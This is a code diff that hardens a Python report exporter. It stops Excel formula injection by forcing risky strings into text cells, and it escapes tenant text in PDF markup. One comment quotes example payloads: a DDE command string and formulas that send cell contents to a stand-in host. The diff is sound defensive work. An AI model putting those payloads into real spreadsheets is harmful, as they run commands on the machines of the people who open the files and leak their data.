@@ -22,6 +22,7 @@ A Column is a dict:
 
 xlsx uses openpyxl (already a dep). pdf uses reportlab (added to requirements).
 """
+import re
 from io import BytesIO
 
 # Visual parity with export.tsx: header fill #1E3A5F = rgb(30,58,95).
@@ -54,6 +55,69 @@ def _display(col, row):
     return "" if v is None else str(v)
 
 
+# ── CSV / Excel formula injection (H7, 2026-08-05 security audit) ────────────────────────────────
+# These workbooks are EMAILED and WhatsApp'd to owners and DMs, so a payload sitting in tenant data
+# travels to a human who opens it in Excel. openpyxl types any string starting with "=" as a FORMULA
+# (`data_type == 'f'` → an <f> element), which is exactly the DDE/exfil vector:
+#     =cmd|'/C calc'!A0        =IMPORTXML(CONCAT("http://x/",A1),"//a")     =HYPERLINK("http://x?"&A1)
+# (Proven live, not assumed: see harness_export_xss_upload.py section A.)
+#
+# THE FIX PRESERVES THE VALUE EXACTLY. It does NOT prefix an apostrophe — openpyxl stores an
+# apostrophe as a literal character (Excel's quote-prefix is a STYLE, not text), so prefixing would
+# print `'-1234.56` into every report. Instead the cell is forced to a text cell
+# (`data_type = 's'` → `<c t="inlineStr">`) and marked with Excel's own quotePrefix style. Displayed
+# characters are byte-identical; Excel never evaluates it, and never re-evaluates it if edited.
+#
+# THE ANTI-REGRESSION RULE IS THE WHOLE POINT. A value that merely LOOKS dangerous but is ordinary
+# business data is left completely untouched:
+#   · money columns are written as real FLOATS with a number format — never strings — so they can
+#     never enter this path at all;
+#   · a plain numeric string ("-1234.56", "+250", "-1,234.56", "-$99.00", "-3.5%", "1e5") is a number
+#     to Excel, not a formula, and is passed through unchanged;
+#   · dates and phone numbers never start with "="; "+1 (555) 123-4567" IS neutralised, and still
+#     displays character-for-character as typed.
+_RISKY_LEAD = ("=", "+", "-", "@", "\t", "\r", "\n")
+
+_NUMERICISH = re.compile(
+    r"""^[+-]?                 # optional sign — the ONLY reason a legitimate cell starts with + or -
+        \$?\s*                 # optional currency symbol ("-$1,234.56")
+        (?:\d{1,3}(?:,\d{3})+|\d+)   # 1,234,567  or  1234567
+        (?:\.\d+)?             # decimals
+        (?:[eE][+-]?\d+)?      # scientific notation
+        \s*%?$                 # optional trailing percent
+    """,
+    re.VERBOSE,
+)
+
+
+def _is_formula_risky(value) -> bool:
+    """True only for a STRING that Excel/Sheets would evaluate, and that is not ordinary numeric data.
+    Non-strings (int/float/Decimal/date/datetime/bool/None) can never be formulas → always False."""
+    if not isinstance(value, str) or not value:
+        return False
+    if value[0] not in _RISKY_LEAD:
+        return False
+    return not _NUMERICISH.match(value.strip())
+
+
+def _para(v) -> str:
+    """Escape for reportlab's Paragraph mini-markup. Paragraph parses `& < >` as markup, so a store
+    literally named "A & B" — or any tenant string containing `<` — makes doc.build() RAISE and the
+    whole PDF send fail. Data cells were already escaped; the title, subtitle, sheet name and column
+    headers were not, and all four carry tenant text. Same escape, one helper (2026-08-05)."""
+    return str("" if v is None else v).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
+
+
+def _write_text_cell(cell, value):
+    """Force `cell` to a literal TEXT cell without altering a single displayed character."""
+    cell.value = value
+    cell.data_type = "s"          # <c t="inlineStr"> — never <f>
+    try:
+        cell.quotePrefix = True   # Excel's own "this is text" marker; survives a user edit
+    except Exception:
+        pass                      # older openpyxl → data_type alone is already sufficient
+
+
 # ── Excel ────────────────────────────────────────────────────────────────────
 def build_xlsx(payload: dict) -> bytes:
     from openpyxl import Workbook
@@ -79,9 +143,14 @@ def build_xlsx(payload: dict) -> bytes:
         cols = sheet.get("columns") or []
         rows = sheet.get("rows") or []
 
-        # Header row
+        # Header row (a column header is configurable in places, so it gets the same guard)
         for ci, col in enumerate(cols, start=1):
-            c = ws.cell(row=1, column=ci, value=col.get("header") or "")
+            hdr = col.get("header") or ""
+            c = ws.cell(row=1, column=ci)
+            if _is_formula_risky(hdr):
+                _write_text_cell(c, hdr)
+            else:
+                c.value = hdr
             c.fill = header_fill
             c.font = header_font
 
@@ -89,6 +158,8 @@ def build_xlsx(payload: dict) -> bytes:
         for ri, row in enumerate(rows, start=2):
             for ci, col in enumerate(cols, start=1):
                 if col.get("money"):
+                    # Money is a real float + number format — it can never be a formula, and this is
+                    # also why the H7 guard cannot touch a single currency figure.
                     try:
                         val = float(_raw(col, row) or 0)
                     except (TypeError, ValueError):
@@ -98,7 +169,12 @@ def build_xlsx(payload: dict) -> bytes:
                     cell.alignment = right
                 else:
                     v = _raw(col, row)
-                    cell = ws.cell(row=ri, column=ci, value=("" if v is None else v))
+                    v = "" if v is None else v
+                    cell = ws.cell(row=ri, column=ci)
+                    if _is_formula_risky(v):
+                        _write_text_cell(cell, v)   # H7: literal text, displayed value unchanged
+                    else:
+                        cell.value = v
                     if col.get("align") == "right":
                         cell.alignment = right
 
@@ -141,16 +217,16 @@ def build_pdf(payload: dict) -> bytes:
                                 textColor=colors.white, fontName="Helvetica-Bold")
     header_color = colors.Color(HEADER_RGB[0] / 255, HEADER_RGB[1] / 255, HEADER_RGB[2] / 255)
 
-    story = [Paragraph(payload.get("title") or "Report", h1)]
+    story = [Paragraph(_para(payload.get("title") or "Report"), h1)]
     if payload.get("subtitle"):
-        story.append(Paragraph(str(payload["subtitle"]), sub))
+        story.append(Paragraph(_para(payload["subtitle"]), sub))
 
     sheets = payload.get("sheets") or []
     for si, sheet in enumerate(sheets):
         cols = sheet.get("columns") or []
         rows = sheet.get("rows") or []
         if len(sheets) > 1:
-            story.append(Paragraph(f"{sheet.get('name') or 'Sheet'}  ({len(rows)})", h2))
+            story.append(Paragraph(f"{_para(sheet.get('name') or 'Sheet')}  ({len(rows)})", h2))
         if not cols:
             continue
         if not rows:
@@ -159,12 +235,12 @@ def build_pdf(payload: dict) -> bytes:
             continue
 
         # Header cells as Paragraphs so long headers wrap.
-        header_cells = [Paragraph(str(c.get("header") or ""), head_style) for c in cols]
+        header_cells = [Paragraph(_para(c.get("header") or ""), head_style) for c in cols]
         data = [header_cells]
         for row in rows:
             line = []
             for col in cols:
-                txt = _display(col, row).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
+                txt = _para(_display(col, row))
                 line.append(Paragraph(txt, cell_style))
             data.append(line)
 
